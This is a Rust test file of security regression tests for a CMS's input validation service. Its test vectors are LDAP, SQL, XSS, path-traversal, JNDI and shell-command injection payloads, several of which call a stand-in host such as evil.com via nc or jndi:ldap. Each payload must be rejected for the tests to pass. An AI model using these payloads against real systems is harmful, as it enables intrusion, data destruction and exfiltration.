use avored_rust_cms::error::Error;
use avored_rust_cms::services::input_validation_service::InputValidationService;
use avored_rust_cms::services::ldap_connection_pool::AuthRateLimiter;
use avored_rust_cms::services::security_audit_service::{SecurityAuditService, SecurityEvent};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use std::net::IpAddr;

/// Security regression tests to ensure that future code changes cannot break security measures
/// These tests are designed to fail if security features are removed or weakened

#[cfg(test)]
mod security_regression_prevention {
    use super::*;

    /// Test that LDAP injection prevention cannot be bypassed
    #[test]
    fn test_ldap_injection_prevention_cannot_be_disabled() {
        // These specific injection payloads MUST always be rejected
        let critical_injections = vec![
            "admin)(|(objectClass=*))",
            "admin)(&(objectClass=*))",
            "admin)(uid=*)",
            "admin*",
            "admin(cn=*)",
            "admin))(|(uid=*",
            "admin\\2a",
            "admin\\28",
            "admin\\29",
            "admin\\5c",
        ];

        for injection in critical_injections {
            let result = InputValidationService::validate_username(injection);
            assert!(result.is_err(), 
                "SECURITY REGRESSION: LDAP injection '{}' was not blocked! This indicates the LDAP injection prevention has been disabled or weakened.", 
                injection);
        }
    }

    /// Test that SQL injection prevention cannot be bypassed
    #[test]
    fn test_sql_injection_prevention_cannot_be_disabled() {
        let sql_injections = vec![
            "admin'; DROP TABLE users; --",
            "admin' OR '1'='1",
            "admin' UNION SELECT * FROM users --",
            "admin' --",
            "admin'; DELETE FROM users; --",
            "admin' OR 1=1 --",
            "admin'; INSERT INTO users VALUES ('hacker', 'password'); --",
        ];

        for injection in sql_injections {
            let result = InputValidationService::validate_username(injection);
            assert!(result.is_err(), 
                "SECURITY REGRESSION: SQL injection '{}' was not blocked! This indicates SQL injection prevention has been disabled or weakened.", 
                injection);
        }
    }

    /// Test that XSS prevention cannot be bypassed
    #[test]
    fn test_xss_prevention_cannot_be_disabled() {
        let xss_payloads = vec![
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')>",
            "';alert('xss');//",
            "\"><script>alert('xss')</script>",
        ];

        for payload in xss_payloads {
            let result = InputValidationService::validate_username(payload);
            assert!(result.is_err(), 
                "SECURITY REGRESSION: XSS payload '{}' was not blocked! This indicates XSS prevention has been disabled or weakened.", 
                payload);
        }
    }

    /// Test that path traversal prevention cannot be bypassed
    #[test]
    fn test_path_traversal_prevention_cannot_be_disabled() {
        let path_traversals = vec![
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ];

        for traversal in path_traversals {
            let result = InputValidationService::validate_username(traversal);
            assert!(result.is_err(), 
                "SECURITY REGRESSION: Path traversal '{}' was not blocked! This indicates path traversal prevention has been disabled or weakened.", 
                traversal);
        }
    }

    /// Test that command injection prevention cannot be bypassed
    #[test]
    fn test_command_injection_prevention_cannot_be_disabled() {
        let command_injections = vec![
            "admin; rm -rf /",
            "admin | nc evil.com 1337",
            "admin && ping evil.com",
            "admin || ping evil.com",
            "admin `whoami`",
            "admin $(whoami)",
            "admin & ping evil.com",
            "admin; cat /etc/passwd",
        ];

        for injection in command_injections {
            let result = InputValidationService::validate_username(injection);
            assert!(result.is_err(), 
                "SECURITY REGRESSION: Command injection '{}' was not blocked! This indicates command injection prevention has been disabled or weakened.", 
                injection);
        }
    }

    /// Test that JNDI injection prevention cannot be bypassed
    #[test]
    fn test_jndi_injection_prevention_cannot_be_disabled() {
        let jndi_injections = vec![
            "${jndi:ldap://evil.com/a}",
            "${jndi:rmi://evil.com/a}",
            "${jndi:dns://evil.com/a}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
            "${jndi:ldap://127.0.0.1:1389/a}",
        ];

        for injection in jndi_injections {
            let result = InputValidationService::validate_username(injection);
            assert!(result.is_err(), 
                "SECURITY REGRESSION: JNDI injection '{}' was not blocked! This indicates JNDI injection prevention has been disabled or weakened.", 
                injection);
        }
    }

    /// Test that null byte injection prevention cannot be bypassed
    #[test]
    fn test_null_byte_injection_prevention_cannot_be_disabled() {
        let null_byte_injections = vec![
            "admin\x00",
            "admin\x00.txt",
            "admin\x00/etc/passwd",
            "admin\x00\x01\x02",
            "admin\x00'; DROP TABLE users; --",
        ];

        for injection in null_byte_injections {
            let result = InputValidationService::validate_username(injection);
            assert!(result.is_err(), 
                "SECURITY REGRESSION: Null byte injection '{}' was not blocked! This indicates null byte injection prevention has been disabled or weakened.", 
                injection);
        }
    }

    /// Test that rate limiting cannot be disabled
    #[tokio::test]
    async fn test_rate_limiting_cannot_be_disabled() {
        let rate_limiter = AuthRateLimiter::new(5, Duration::from_secs(300));
        let identifier = "test_user".to_string();

        // Make 5 attempts (should be allowed)
        for i in 0..5 {
            let allowed = rate_limiter.is_allowed(&identifier).await;
            assert!(allowed, "Rate limiter rejected attempt {} when it should allow 5 attempts", i + 1);
        }

        // 6th attempt should be blocked
        let blocked = rate_limiter.is_allowed(&identifier).await;
        assert!(!blocked, 
            "SECURITY REGRESSION: Rate limiting is not working! The 6th attempt was allowed when it should be blocked. This indicates rate limiting has been disabled or weakened.");
    }

    /// Test that timing attack prevention cannot be disabled
    #[tokio::test]
    async fn test_timing_attack_prevention_cannot_be_disabled() {
        let test_cases = vec![
            ("valid_user", "valid_pass"),
            ("invalid_user", "invalid_pass"),
            ("admin)(|(objectClass=*)", "password"),
            ("nonexistent", "wrong"),
        ];

        let mut timings = Vec::new();

        for (username, password) in test_cases {
            let start = Instant::now();
            
            // Simulate the validation process
            let _username_result = InputValidationService::validate_username(username);
            let _password_result = InputValidationService::validate_password(password);
            
            // The actual implementation should enforce minimum timing
            let min_duration = Duration::from_millis(100);
            let elapsed = start.elapsed();
            if elapsed < min_duration {
                tokio::time::sleep(min_duration - elapsed).await;
            }
            
            timings.push(start.elapsed());
        }

        // All responses must take at least 100ms to prevent timing attacks
        for (i, timing) in timings.iter().enumerate() {
            assert!(timing >= &Duration::from_millis(100), 
                "SECURITY REGRESSION: Response {} was too fast ({:?}). This indicates timing attack prevention has been disabled or weakened.", 
                i, timing);
        }

        // Variance should be minimal
        let min_time = timings.iter().min().unwrap();
        let max_time = timings.iter().max().unwrap();
        let variance = max_time.as_millis() - min_time.as_millis();
        
        assert!(variance < 100, 
            "SECURITY REGRESSION: Timing variance is too high ({}ms). This could allow timing attacks and indicates timing consistency has been weakened.", 
            variance);
    }

    /// Test that security audit logging cannot be disabled
    #[tokio::test]
    async fn test_security_audit_logging_cannot_be_disabled() {
        let audit_service = SecurityAuditService::new(100);
        let timestamp = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();

        // Log a security event
        let event = SecurityEvent::AuthenticationAttempt {
            username: "test_user".to_string(),
            provider: "ldap".to_string(),
            success: false,
            ip_address: Some("192.168.1.100".parse().unwrap()),
            user_agent: Some("TestAgent/1.0".to_string()),
            timestamp,
        };

        audit_service.log_event(event).await;

        // Verify the event was logged
        let events = audit_service.get_recent_events(10).await;
        assert!(!events.is_empty(), 
            "SECURITY REGRESSION: Security audit logging is not working! Events are not being logged. This indicates security audit logging has been disabled.");

        // Verify the event contains expected data
        let logged_event = &events[0];
        match logged_event {
            SecurityEvent::AuthenticationAttempt { username, success, .. } => {
                assert_eq!(username, "test_user");
                assert_eq!(*success, false);
            }
            _ => panic!("SECURITY REGRESSION: Wrong event type logged. Security audit logging may be corrupted."),
        }
    }

    /// Test that suspicious activity detection cannot be disabled
    #[tokio::test]
    async fn test_suspicious_activity_detection_cannot_be_disabled() {
        let audit_service = SecurityAuditService::new(100);
        let timestamp = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();

        // Simulate brute force attack (10+ failed attempts)
        for i in 0..12 {
            let event = SecurityEvent::AuthenticationAttempt {
                username: "target_user".to_string(),
                provider: "ldap".to_string(),
                success: false,
                ip_address: Some("192.168.1.100".parse().unwrap()),
                user_agent: Some("AttackBot/1.0".to_string()),
                timestamp: timestamp + i,
            };
            audit_service.log_event(event).await;
        }

        // Check if suspicious activity was detected
        let events = audit_service.get_recent_events(50).await;
        let suspicious_events: Vec<_> = events.iter().filter(|event| {
            matches!(event, SecurityEvent::SuspiciousActivity { .. })
        }).collect();

        assert!(!suspicious_events.is_empty(), 
            "SECURITY REGRESSION: Suspicious activity detection is not working! Brute force attack was not detected. This indicates suspicious activity detection has been disabled.");
    }

    /// Test that input length limits cannot be bypassed
    #[test]
    fn test_input_length_limits_cannot_be_bypassed() {
        // Test username length limit (256 characters)
        let long_username = "a".repeat(257);
        let result = InputValidationService::validate_username(&long_username);
        assert!(result.is_err(), 
            "SECURITY REGRESSION: Username length limit was bypassed! This indicates input length validation has been disabled or weakened.");

        // Test password length limit (1024 characters)
        let long_password = "a".repeat(1025);
        let result = InputValidationService::validate_password(&long_password);
        assert!(result.is_err(), 
            "SECURITY REGRESSION: Password length limit was bypassed! This indicates input length validation has been disabled or weakened.");

        // Test email length limit (320 characters)
        let long_email = format!("{}@example.com", "a".repeat(310));
        let result = InputValidationService::validate_email(&long_email);
        assert!(result.is_err(), 
            "SECURITY REGRESSION: Email length limit was bypassed! This indicates input length validation has been disabled or weakened.");
    }

    /// Test that empty input validation cannot be bypassed
    #[test]
    fn test_empty_input_validation_cannot_be_bypassed() {
        // Empty username should be rejected
        let result = InputValidationService::validate_username("");
        assert!(result.is_err(), 
            "SECURITY REGRESSION: Empty username was accepted! This indicates empty input validation has been disabled or weakened.");

        // Empty password should be rejected
        let result = InputValidationService::validate_password("");
        assert!(result.is_err(), 
            "SECURITY REGRESSION: Empty password was accepted! This indicates empty input validation has been disabled or weakened.");

        // Empty email should be rejected
        let result = InputValidationService::validate_email("");
        assert!(result.is_err(), 
            "SECURITY REGRESSION: Empty email was accepted! This indicates empty input validation has been disabled or weakened.");
    }

    /// Test that control character filtering cannot be bypassed
    #[test]
    fn test_control_character_filtering_cannot_be_bypassed() {
        let control_chars = vec![
            "admin\x01",
            "admin\x02",
            "admin\x03",
            "admin\x04",
            "admin\x05",
            "admin\x06",
            "admin\x07",
            "admin\x08",
            "admin\x0B",
            "admin\x0C",
            "admin\x0E",
            "admin\x0F",
            "admin\x10",
            "admin\x11",
            "admin\x12",
            "admin\x13",
            "admin\x14",
            "admin\x15",
            "admin\x16",
            "admin\x17",
            "admin\x18",
            "admin\x19",
            "admin\x1A",
            "admin\x1B",
            "admin\x1C",
            "admin\x1D",
            "admin\x1E",
            "admin\x1F",
            "admin\x7F",
        ];

        for control_char_input in control_chars {
            let result = InputValidationService::validate_username(control_char_input);
            assert!(result.is_err(), 
                "SECURITY REGRESSION: Control character input '{}' was accepted! This indicates control character filtering has been disabled or weakened.", 
                control_char_input.escape_debug());
        }
    }
}
